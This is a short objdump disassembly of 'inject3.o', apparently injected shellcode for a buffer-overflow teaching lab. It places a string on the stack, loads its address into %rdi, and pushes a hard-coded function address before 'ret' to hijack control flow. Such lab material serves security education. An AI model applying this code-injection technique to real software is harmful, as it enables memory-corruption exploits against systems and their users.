
inject3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 44 24 04 37 37 	movq   $0x33313737,0x4(%rsp)
   7:	31 33 
   9:	48 c7 04 24 31 30 65 	movq   $0x64653031,(%rsp)
  10:	64 
  11:	48 8d 3c 24          	lea    (%rsp),%rdi
  15:	68 be 17 40 00       	pushq  $0x4017be
  1a:	c3                   	retq   
